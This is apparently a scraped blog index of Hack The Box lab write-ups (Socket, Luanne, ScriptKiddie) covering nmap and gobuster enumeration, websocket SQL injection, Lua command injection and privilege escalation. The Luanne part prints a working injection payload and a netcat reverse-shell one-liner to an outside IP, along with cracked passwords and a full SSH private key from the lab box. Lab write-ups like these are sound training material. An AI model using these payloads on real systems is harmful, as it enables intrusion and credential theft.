SF:t\\x20connection:\\x20did\\x20not\\x20receive\\x20a\\x20valid\\x20HTTP\\x20requ SF:est\\.\\n\u0026#34;)%r(HTTPOptions,F4,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nDate: SF:\\x20Tue,\\x2023\\x20May\\x202023\\x2016:58:16\\x20GMT\\r\\nServer:\\x20Python/3 SF:\\.10\\x20websockets/10\\.4\\r\\nContent-Length:\\x2077\\r\\nContent-Type:\\x20t SF:ext/plain\\r\\nConnection:\\x20close\\r\\n\\r\\nFailed\\x20to\\x20open\\x20a\\x20W SF:ebSocket\\x20connection:\\x20did\\x20not\\x20receive\\x20a\\x20valid\\x20HTTP\\ SF:x20request\\.\\n\u0026#34;)%r(RTSPRequest,F4,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r SF:\\nDate:\\x20Tue,\\x2023\\x20May\\x202023\\x2016:58:16\\x20GMT\\r\\nServer:\\x20P SF:ython/3\\.10\\x20websockets/10\\.4\\r\\nContent-Length:\\x2077\\r\\nContent-Typ SF:e:\\x20text/plain\\r\\nConnection:\\x20close\\r\\n\\r\\nFailed\\x20to\\x20open\\x2 SF:0a\\x20WebSocket\\x20connection:\\x20did\\x20not\\x20receive\\x20a\\x20valid\\x SF:20HTTP\\x20request\\.\\n\u0026#34;)%r(Help,F4,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r SF:\\nDate:\\x20Tue,\\x2023\\x20May\\x202023\\x2016:58:32\\x20GMT\\r\\nServer:\\x20P SF:ython/3\\.10\\x20websockets/10\\.4\\r\\nContent-Length:\\x2077\\r\\nContent-Typ SF:e:\\x20text/plain\\r\\nConnection:\\x20close\\r\\n\\r\\nFailed\\x20to\\x20open\\x2 SF:0a\\x20WebSocket\\x20connection:\\x20did\\x20not\\x20receive\\x20a\\x20valid\\x SF:20HTTP\\x20request\\.\\n\u0026#34;)%r(SSLSessionReq,F4,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20 SF:Request\\r\\nDate:\\x20Tue,\\x2023\\x20May\\x202023\\x2016:58:33\\x20GMT\\r\\nSer SF:ver:\\x20Python/3\\.10\\x20websockets/10\\.4\\r\\nContent-Length:\\x2077\\r\\nCo SF:ntent-Type:\\x20text/plain\\r\\nConnection:\\x20close\\r\\n\\r\\nFailed\\x20to\\x SF:20open\\x20a\\x20WebSocket\\x20connection:\\x20did\\x20not\\x20receive\\x20a\\x SF:20valid\\x20HTTP\\x20request\\.\\n\u0026#34;); Service Info: Host: qreader.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 102.05 seconds gobuster â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ gobuster dir -u http://qreader.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://qreader.htb [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/05/23 18:03:37 Starting gobuster in directory enumeration mode =============================================================== /report (Status: 200) [Size: 4161] /embed (Status: 405) [Size: 153] /reader (Status: 405) [Size: 153] /server-status (Status: 403) [Size: 276] Web server There are download links on the website to the app Foothold/User The initial static analysis showed that it was python compiled binary I followed the post And now we have something we can read We see a websocket and hostname We find 2 routes: /update and /version We can also use wireshark and intercept the traffic of the application to confirm the routes So now we can play around with the socket I used web socket browser extension After playing arount with the payload, I found out that it was vulnerable to SQLi I was trying to make it work with sqlmap There is a nice post that can help you achieve this After dumping the database we have: The hash and a user, so we can craft the possible username variants using username-anarchy Let\u0026rsquo;s crack the hash Now we can use crackmapexec to find our creds Login via ssh Root Let\u0026rsquo;s check sudo rights We have rights to execute a script as root We have a pyinstaller According to the docs we need to supply spec file: The spec file is actually executable Pyt+hon code... We can try abusing it by creating spec file with python code and supplying to script Launch a listener and execute the script ","date":"July 15, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/socket/images/socket.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/socket/","summary":"Socket Enumeration Nmap â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ nmap -Pn -p22,80,5789 -sC -sV 10.10.11.206 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-23 17:58 BST Nmap scan report for 10.10.11.206 (10.10.11.206) Host is up (0.11s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA) |_ 256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519) 80/tcp open http Apache httpd 2.4.52 |_http-title: Did not follow redirect to http://qreader.","tags":["HTB","qrcode","websocket","username-anarchy","websocket-sqli","pyinstaller","pyinstxtractor","pycdc"],"title":"[HTB] Machine: Socket"},{"categories":null,"contents":"Luanne Enumeration Nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.218 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-11 17:33 BST Nmap scan report for 10.10.10.218 (10.10.10.218) Host is up (0.15s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0) | ssh-hostkey: | 3072 20977f6c4a6e5d20cffda3aaa90d37db (RSA) | 521 35c329e187706d7374b2a9a204a96669 (ECDSA) |_ 256 b3bd316dcc226b18ed2766b4a72ae4a5 (ED25519) 80/tcp open http nginx 1.19.0 | http-robots.txt: 1 disallowed entry |_/weather |_http-server-header: nginx/1.19.0 | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Basic realm=. |_http-title: 401 Unauthorized 9001/tcp open http Medusa httpd 1.12 (Supervisor process manager) |_http-title: Error response | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Basic realm=default |_http-server-header: Medusa/1.12 Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 204.16 seconds Web server Foothold If we visit port 9001, we have login page but it shows nothing else nmap tells us some information about Supervisor process manager and realm Googling reveals the configuration The creds work user:123 We see an interesting process\n/usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3000 -L weather /usr/local/webapi/weather.lua -U _httpd -b /var/www -L weather /usr/local/webapi/weather.lua - Adds /usr/local/webapi/weather.lua Lua script for the prefix weather (man page) ... will trigger the execution of the Lua script when a URL in the form http://10.10.10.218/weather/\u0026lt;name\u0026gt; is being accessed Let\u0026rsquo;s check port 80\nWe see port â””â”€$ curl -v http://10.10.10.218 * Trying 10.10.10.218:80... * Connected to 10.10.10.218 (10.10.10.218) port 80 (#0) \u0026gt; GET / HTTP/1.1 \u0026gt; Host: 10.10.10.218 \u0026gt; User-Agent: curl/7.88.1 \u0026gt; Accept: */* \u0026gt; \u0026lt; HTTP/1.1 401 Unauthorized \u0026lt; Server: nginx/1.19.0 \u0026lt; Date: Thu, 20 Jul 2023 18:05:49 GMT \u0026lt; Content-Type: text/html \u0026lt; Content-Length: 209 \u0026lt; Connection: keep-alive \u0026lt; WWW-Authenticate: Basic realm=\u0026#34;.\u0026#34; \u0026lt; \u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;401 Unauthorized\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt;\u0026lt;h1\u0026gt;401 Unauthorized\u0026lt;/h1\u0026gt; /index.html: \u0026lt;pre\u0026gt;No authorization\u0026lt;/pre\u0026gt; \u0026lt;hr\u0026gt;\u0026lt;address\u0026gt;\u0026lt;a href=\u0026#34;//127.0.0.1:3000/\u0026#34;\u0026gt;127.0.0.1:3000\u0026lt;/a\u0026gt;\u0026lt;/address\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; * Connection #0 to host 10.10.10.218 left intact Let\u0026rsquo;s gobuster weather directory â””â”€$ gobuster dir -u http://10.10.10.218/weather -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.218/weather [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/07/20 19:11:39 Starting gobuster in directory enumeration mode =============================================================== /forecast (Status: 200) [Size: 90] Visit the page The result of visiting ?city=London â””â”€$ curl -s http://10.10.10.218/weather/forecast?city=London | jq { \u0026#34;code\u0026#34;: 200, \u0026#34;city\u0026#34;: \u0026#34;London\u0026#34;, \u0026#34;list\u0026#34;: [ { \u0026#34;date\u0026#34;: \u0026#34;2023-07-20\u0026#34;, \u0026#34;weather\u0026#34;: { \u0026#34;description\u0026#34;: \u0026#34;snowy\u0026#34;, \u0026#34;temperature\u0026#34;: { \u0026#34;min\u0026#34;: \u0026#34;12\u0026#34;, \u0026#34;max\u0026#34;: \u0026#34;46\u0026#34; }, \u0026#34;pressure\u0026#34;: \u0026#34;1799\u0026#34;, \u0026#34;humidity\u0026#34;: \u0026#34;92\u0026#34;, \u0026#34;wind\u0026#34;: { \u0026#34;speed\u0026#34;: \u0026#34;2.1975513692014\u0026#34;, \u0026#34;degree\u0026#34;: \u0026#34;102.76822959445\u0026#34; } } }, { \u0026#34;date\u0026#34;: \u0026#34;2023-07-21\u0026#34;, \u0026#34;weather\u0026#34;: { \u0026#34;description\u0026#34;: \u0026#34;partially cloudy\u0026#34;, \u0026#34;temperature\u0026#34;: { \u0026#34;min\u0026#34;: \u0026#34;15\u0026#34;, \u0026#34;max\u0026#34;: \u0026#34;43\u0026#34; }, \u0026#34;pressure\u0026#34;: \u0026#34;1365\u0026#34;, \u0026#34;humidity\u0026#34;: \u0026#34;51\u0026#34;, \u0026#34;wind\u0026#34;: { \u0026#34;speed\u0026#34;: \u0026#34;4.9522297247313\u0026#34;, \u0026#34;degree\u0026#34;: \u0026#34;262.63571172766\u0026#34; } } }, { \u0026#34;date\u0026#34;: \u0026#34;2023-07-22\u0026#34;, \u0026#34;weather\u0026#34;: { \u0026#34;description\u0026#34;: \u0026#34;sunny\u0026#34;, \u0026#34;temperature\u0026#34;: { \u0026#34;min\u0026#34;: \u0026#34;19\u0026#34;, \u0026#34;max\u0026#34;: \u0026#34;30\u0026#34; }, \u0026#34;pressure\u0026#34;: \u0026#34;1243\u0026#34;, \u0026#34;humidity\u0026#34;: \u0026#34;13\u0026#34;, \u0026#34;wind\u0026#34;: { \u0026#34;speed\u0026#34;: \u0026#34;1.8041767538525\u0026#34;, \u0026#34;degree\u0026#34;: \u0026#34;48.400944394059\u0026#34; } } }, { \u0026#34;date\u0026#34;: \u0026#34;2023-07-23\u0026#34;, \u0026#34;weather\u0026#34;: { \u0026#34;description\u0026#34;: \u0026#34;sunny\u0026#34;, \u0026#34;temperature\u0026#34;: { \u0026#34;min\u0026#34;: \u0026#34;30\u0026#34;, \u0026#34;max\u0026#34;: \u0026#34;34\u0026#34; }, \u0026#34;pressure\u0026#34;: \u0026#34;1513\u0026#34;, \u0026#34;humidity\u0026#34;: \u0026#34;84\u0026#34;, \u0026#34;wind\u0026#34;: { \u0026#34;speed\u0026#34;: \u0026#34;2.6126398323104\u0026#34;, \u0026#34;degree\u0026#34;: \u0026#34;191.63755226741\u0026#34; } } }, { \u0026#34;date\u0026#34;: \u0026#34;2023-07-24\u0026#34;, \u0026#34;weather\u0026#34;: { \u0026#34;description\u0026#34;: \u0026#34;partially cloudy\u0026#34;, \u0026#34;temperature\u0026#34;: { \u0026#34;min\u0026#34;: \u0026#34;30\u0026#34;, \u0026#34;max\u0026#34;: \u0026#34;36\u0026#34; }, \u0026#34;pressure\u0026#34;: \u0026#34;1772\u0026#34;, \u0026#34;humidity\u0026#34;: \u0026#34;53\u0026#34;, \u0026#34;wind\u0026#34;: { \u0026#34;speed\u0026#34;: \u0026#34;2.7699138359167\u0026#34;, \u0026#34;degree\u0026#34;: \u0026#34;104.89152945159\u0026#34; } } } ] } If we visit the city that is not in the list, we get an error â””â”€$ curl -s http://10.10.10.218/weather/forecast?city=Moscow | jq { \u0026#34;code\u0026#34;: 500, \u0026#34;error\u0026#34;: \u0026#34;unknown city: Moscow\u0026#34; } There is a post regarding lua vulnerabilities If we fuzz for special chars with ffuf we find 2 cases there request breaks â””â”€$ ffuf -w /usr/share/seclists/Fuzzing/special-chars.txt -u http://10.10.10.218/weather/forecast?city=FUZZ -mc 500 -fw 5 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.0.0-dev ________________________________________________ :: Method : GET :: URL : http://10.10.10.218/weather/forecast?city=FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Fuzzing/special-chars.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 500 :: Filter : Response words: 5 ________________________________________________ [Status: 500, Size: 40, Words: 6, Lines: 1, Duration: 183ms] * FUZZ: + [Status: 500, Size: 77, Words: 9, Lines: 2, Duration: 109ms] * FUZZ: \u0026#39; :: Progress: [32/32] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 :: If we try ', we see an error â””â”€$ curl \u0026#34;http://10.10.10.218/weather/forecast?city=\u0026#39;\u0026#34; \u0026lt;br\u0026gt;Lua error: /usr/local/webapi/weather.lua:49: attempt to call a nil value If we search fuzz ' with different combinations of chars, we have nothing But if we add -- which specifies the comment block in lua, we have the same error So we start fuzzing the following combination 'FUZZ-- to find something â””â”€$ curl \u0026#34;http://10.10.10.218/weather/forecast?city=\u0026#39;--\u0026#34; \u0026lt;br\u0026gt;Lua error: /usr/local/webapi/weather.lua:49: attempt to call a nil value â””â”€$ ffuf -w /usr/share/seclists/Fuzzing/special-chars.txt -u \u0026#34;http://10.10.10.218/weather/forecast?city=\u0026#39;FUZZ--\u0026#34; -mc 200,500 -fw 9 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.0.0-dev ________________________________________________ :: Method : GET :: URL : http://10.10.10.218/weather/forecast?city=\u0026#39;FUZZ-- :: Wordlist : FUZZ: /usr/share/seclists/Fuzzing/special-chars.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,500 :: Filter : Response words: 9 ________________________________________________ [Status: 500, Size: 37, Words: 5, Lines: 1, Duration: 106ms] * FUZZ: ) :: Progress: [32/32] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 :: And now we have the following output â””â”€$ curl \u0026#34;http://10.10.10.218/weather/forecast?city=\u0026#39;)--\u0026#34; {\u0026#34;code\u0026#34;: 500,\u0026#34;error\u0026#34;: \u0026#34;unknown city: Let\u0026rsquo;s try a command injection And it works â””â”€$ curl \u0026#34;http://10.10.10.218/weather/forecast?city=\u0026#39;)os.execute(\u0026#39;id\u0026#39;)--\u0026#34; {\u0026#34;code\u0026#34;: 500,\u0026#34;error\u0026#34;: \u0026#34;unknown city: uid=24(_httpd) gid=24(_httpd) groups=24(_httpd) Let\u0026rsquo;s get reverse shell curl \u0026quot;http://10.10.10.218/weather/forecast?city=')os.execute('rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.16.12%206666%20%3E%2Ftmp%2Ff')--\u0026quot; User Let\u0026rsquo;s enumerate We have a .htpasswd hashcat -m 500 hash /usr/share/wordlists/rockyou.txt $1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0:iamthebest But we can do nothing with the password /etc/passwd Another user r.michaels root:*:0:0:Charlie \u0026amp;:/root:/bin/sh toor:*:0:0:Bourne-again Superuser:/root:/bin/sh daemon:*:1:1:The devil himself:/:/sbin/nologin operator:*:2:5:System \u0026amp;:/usr/guest/operator:/sbin/nologin bin:*:3:7:Binaries Commands and Source:/:/sbin/nologin games:*:7:13:\u0026amp; pseudo-user:/usr/games:/sbin/nologin postfix:*:12:12:\u0026amp; pseudo-user:/var/spool/postfix:/sbin/nologin named:*:14:14:\u0026amp; pseudo-user:/var/chroot/named:/sbin/nologin ntpd:*:15:15:\u0026amp; pseudo-user:/var/chroot/ntpd:/sbin/nologin sshd:*:16:16:\u0026amp; pseudo-user:/var/chroot/sshd:/sbin/nologin _pflogd:*:18:18:\u0026amp; pseudo-user:/var/chroot/pflogd:/sbin/nologin _rwhod:*:19:19:\u0026amp; pseudo-user:/var/rwho:/sbin/nologin _proxy:*:21:21:Proxy Services:/nonexistent:/sbin/nologin _timedc:*:22:22:\u0026amp; pseudo-user:/nonexistent:/sbin/nologin _sdpd:*:23:23:\u0026amp; pseudo-user:/nonexistent:/sbin/nologin _httpd:*:24:24:\u0026amp; pseudo-user:/var/www:/sbin/nologin _mdnsd:*:25:25:\u0026amp; pseudo-user:/nonexistent:/sbin/nologin _tests:*:26:26:\u0026amp; pseudo-user:/nonexistent:/sbin/nologin _tcpdump:*:27:27:\u0026amp; pseudo-user:/var/chroot/tcpdump:/sbin/nologin _tss:*:28:28:\u0026amp; pseudo-user:/var/tpm:/sbin/nologin _rtadvd:*:30:30:\u0026amp; pseudo-user:/var/chroot/rtadvd:/sbin/nologin _unbound:*:32:32:\u0026amp; pseudo-user:/var/chroot/unbound:/sbin/nologin _nsd:*:33:33:\u0026amp; pseudo-user:/var/chroot/nsd:/sbin/nologin uucp:*:66:1:UNIX-to-UNIX Copy:/nonexistent:/sbin/nologin nobody:*:32767:39:Unprivileged user:/nonexistent:/sbin/nologin r.michaels:*:1000:100::/home/r.michaels:/bin/ksh nginx:*:1001:1000:NGINX server user:/var/db/nginx:/sbin/nologin dbus:*:1002:1001:System message bus:/var/run/dbus:/sbin/nologin Processes launched by r.michaels $ ps auxw | grep michaels r.michaels 185 0.0 0.0 36460 1972 ? Is 4:38PM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3001 -L weather /home We have identical application with a flags -u and -X (Enables directory indexing) Enables the transformation of Uniform Resource Locators of the form /~user/ into the directory ~user/public_html Which means we can access user directory If try it, we have no access $ curl -s http://127.0.0.1:3001/~r.michaels/ \u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;401 Unauthorized\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt;\u0026lt;h1\u0026gt;401 Unauthorized\u0026lt;/h1\u0026gt; ~r.michaels//: \u0026lt;pre\u0026gt;No authorization\u0026lt;/pre\u0026gt; \u0026lt;hr\u0026gt;\u0026lt;address\u0026gt;\u0026lt;a href=\u0026#34;//127.0.0.1:3001/\u0026#34;\u0026gt;127.0.0.1:3001\u0026lt;/a\u0026gt;\u0026lt;/address\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; But if use the creds from .htpasswd, they work $ curl -s http://127.0.0.1:3001/~r.michaels/ -u webapi_user:iamthebest \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;meta charset=\u0026#34;utf-8\u0026#34;/\u0026gt; \u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt; table { border-top: 1px solid black; border-bottom: 1px solid black; } th { background: aquamarine; } tr:nth-child(even) { background: lavender; } \u0026lt;/style\u0026gt; \u0026lt;title\u0026gt;Index of ~r.michaels/\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt;\u0026lt;h1\u0026gt;Index of ~r.michaels/\u0026lt;/h1\u0026gt; \u0026lt;table cols=3\u0026gt; \u0026lt;thead\u0026gt; \u0026lt;tr\u0026gt;\u0026lt;th\u0026gt;Name\u0026lt;th\u0026gt;Last modified\u0026lt;th align=right\u0026gt;Size \u0026lt;tbody\u0026gt; \u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;\u0026lt;a href=\u0026#34;../\u0026#34;\u0026gt;Parent Directory\u0026lt;/a\u0026gt;\u0026lt;td\u0026gt;16-Sep-2020 18:20\u0026lt;td align=right\u0026gt;1kB \u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;\u0026lt;a href=\u0026#34;id_rsa\u0026#34;\u0026gt;id_rsa\u0026lt;/a\u0026gt;\u0026lt;td\u0026gt;16-Sep-2020 16:52\u0026lt;td align=right\u0026gt;3kB \u0026lt;/table\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; We see a private key $ curl -s http://127.0.0.1:3001/~r.michaels/id_rsa -u webapi_user:iamthebest -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn NhAAAAAwEAAQAAAYEAvXxJBbm4VKcT2HABKV2Kzh9GcatzEJRyvv4AAalt349ncfDkMfFB Icxo9PpLUYzecwdU3LqJlzjFga3kG7VdSEWm+C1fiI4LRwv/iRKyPPvFGTVWvxDXFTKWXh 0DpaB9XVjggYHMr0dbYcSF2V5GMfIyxHQ8vGAE+QeW9I0Z2nl54ar/I/j7c87SY59uRnHQ kzRXevtPSUXxytfuHYr1Ie1YpGpdKqYrYjevaQR5CAFdXPobMSxpNxFnPyyTFhAbzQuchD ryXEuMkQOxsqeavnzonomJSuJMIh4ym7NkfQ3eKaPdwbwpiLMZoNReUkBqvsvSBpANVuyK BNUj4JWjBpo85lrGqB+NG2MuySTtfS8lXwDvNtk/DB3ZSg5OFoL0LKZeCeaE6vXQR5h9t8 3CEdSO8yVrcYMPlzVRBcHp00DdLk4cCtqj+diZmR8MrXokSR8y5XqD3/IdH5+zj1BTHZXE pXXqVFFB7Jae+LtuZ3XTESrVnpvBY48YRkQXAmMVAAAFkBjYH6gY2B+oAAAAB3NzaC1yc2 EAAAGBAL18SQW5uFSnE9hwASldis4fRnGrcxCUcr7+AAGpbd+PZ3Hw5DHxQSHMaPT6S1GM 3nMHVNy6iZc4xYGt5Bu1XUhFpvgtX4iOC0cL/4kSsjz7xRk1Vr8Q1xUyll4dA6WgfV1Y4I GBzK9HW2HEhdleRjHyMsR0PLxgBPkHlvSNGdp5eeGq/yP4+3PO0mOfbkZx0JM0V3r7T0lF 8crX7h2K9SHtWKRqXSqmK2I3r2kEeQgBXVz6GzEsaTcRZz8skxYQG80LnIQ68lxLjJEDsb Knmr586J6JiUriTCIeMpuzZH0N3imj3cG8KYizGaDUXlJAar7L0gaQDVbsigTVI+CVowaa POZaxqgfjRtjLskk7X0vJV8A7zbZPwwd2UoOThaC9CymXgnmhOr10EeYfbfNwhHUjvMla3 GDD5c1UQXB6dNA3S5OHArao/nYmZkfDK16JEkfMuV6g9/yHR+fs49QUx2VxKV16lRRQeyW nvi7bmd10xEq1Z6bwWOPGEZEFwJjFQAAAAMBAAEAAAGAStrodgySV07RtjU5IEBF73vHdm xGvowGcJEjK4TlVOXv9cE2RMyL8HAyHmUqkALYdhS1X6WJaWYSEFLDxHZ3bW+msHAsR2Pl 7KE+x8XNB+5mRLkflcdvUH51jKRlpm6qV9AekMrYM347CXp7bg2iKWUGzTkmLTy5ei+XYP DE/9vxXEcTGADqRSu1TYnUJJwdy6lnzbut7MJm7L004hLdGBQNapZiS9DtXpWlBBWyQolX er2LNHfY8No9MWXIjXS6+MATUH27TttEgQY3LVztY0TRXeHgmC1fdt0yhW2eV/Wx+oVG6n NdBeFEuz/BBQkgVE7Fk9gYKGj+woMKzO+L8eDll0QFi+GNtugXN4FiduwI1w1DPp+W6+su o624DqUT47mcbxulMkA+XCXMOIEFvdfUfmkCs/ej64m7OsRaIs8Xzv2mb3ER2ZBDXe19i8 Pm/+ofP8HaHlCnc9jEDfzDN83HX9CjZFYQ4n1KwOrvZbPM1+Y5No3yKq+tKdzUsiwZAAAA wFXoX8cQH66j83Tup9oYNSzXw7Ft8TgxKtKk76lAYcbITP/wQhjnZcfUXn0WDQKCbVnOp6 LmyabN2lPPD3zRtRj5O/sLee68xZHr09I/Uiwj+mvBHzVe3bvLL0zMLBxCKd0J++i3FwOv +ztOM/3WmmlsERG2GOcFPxz0L2uVFve8PtNpJvy3MxaYl/zwZKkvIXtqu+WXXpFxXOP9qc f2jJom8mmRLvGFOe0akCBV2NCGq/nJ4bn0B9vuexwEpxax4QAAAMEA44eCmj/6raALAYcO D1UZwPTuJHZ/89jaET6At6biCmfaBqYuhbvDYUa9C3LfWsq+07/S7khHSPXoJD0DjXAIZk N+59o58CG82wvGl2RnwIpIOIFPoQyim/T0q0FN6CIFe6csJg8RDdvq2NaD6k6vKSk6rRgo IH3BXK8fc7hLQw58o5kwdFakClbs/q9+Uc7lnDBmo33ytQ9pqNVuu6nxZqI2lG88QvWjPg nUtRpvXwMi0/QMLzzoC6TJwzAn39GXAAAAwQDVMhwBL97HThxI60inI1SrowaSpMLMbWqq 189zIG0dHfVDVQBCXd2Rng15eN5WnsW2LL8iHL25T5K2yi+hsZHU6jJ0CNuB1X6ITuHhQg QLAuGW2EaxejWHYC5gTh7jwK6wOwQArJhU48h6DFl+5PUO8KQCDBC9WaGm3EVXbPwXlzp9 9OGmTT9AggBQJhLiXlkoSMReS36EYkxEncYdWM7zmC2kkxPTSVWz94I87YvApj0vepuB7b 45bBkP5xOhrjMAAAAVci5taWNoYWVsc0BsdWFubmUuaHRiAQIDBAUG -----END OPENSSH PRIVATE KEY----- Now we can connect via ssh Root NetBSD has identical to sudo command which doas If we check config file, we see that r.michaels can run anything as root But we need a password If we check home directory of the user, we have backups folder containing archive which is encrypted The directory also contains .gnupg, If we try using the keyrings for decryption, they work Let\u0026rsquo;s check the content of the archive There is a .htpasswd file with credentials Crack it with hashcat webapi_user:littlebear Use the password for doas and get a root flag ","date":"July 9, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/luanne/images/luanne.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/luanne/","summary":"Luanne Enumeration Nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.218 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-11 17:33 BST Nmap scan report for 10.10.10.218 (10.10.10.218) Host is up (0.15s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0) | ssh-hostkey: | 3072 20977f6c4a6e5d20cffda3aaa90d37db (RSA) | 521 35c329e187706d7374b2a9a204a96669 (ECDSA) |_ 256 b3bd316dcc226b18ed2766b4a72ae4a5 (ED25519) 80/tcp open http nginx 1.19.0 | http-robots.","tags":["HTB","netbsd","supervisor-process-manager","ffuf","lua","command-injection","doas","pgp","netpgp"],"title":"[HTB] Machine: Luanne"},{"categories":null,"contents":"ScriptKiddie Enumeration Nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.226 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-10 19:55 BST Nmap scan report for 10.10.10.226 (10.10.10.226) Host is up (0.17s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 3c656bc2dfb99d627427a7b8a9d3252c (RSA) | 256 b9a1785d3c1b25e03cef678d71d3a3ec (ECDSA) |_ 256 8bcf4182c6acef9180377cc94511e843 (ED25519) 5000/tcp open http Werkzeug httpd 0.16.1 (Python 3.8.5) |_http-title: k1d\u0026#39;5 h4ck3r t00l5 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 31.63 seconds Web server Foothold I tried different payloads for command injection, but none of them worked So I checked if there are any exploit for any of the services running But we don\u0026rsquo;t have a version of the mfsvenom So let\u0026rsquo;s try the exploit anyway We can generate payload using msfconsole or python script I chose msfconsole since it was easier to do Generate payload Upload it and launch it User We can read pwn\u0026rsquo;s directory Upon scanning we see scanlosers.sh script, which looks like automated job since it saves output to recon folder We can edit the script But we need to find the format of the lines in the input file /home/kid/logs/hackers If we grep for hackers in kid\u0026rsquo;s home directory we find the source code for the app and the lines of code responsible for saving the logs Looks like the format is [2023-07-10 21:18:21.342176] 10.10.16.12 But the file is empty, which means it get cleaned since I definitely tried command injections Let\u0026rsquo;s try injecting the commands to the log 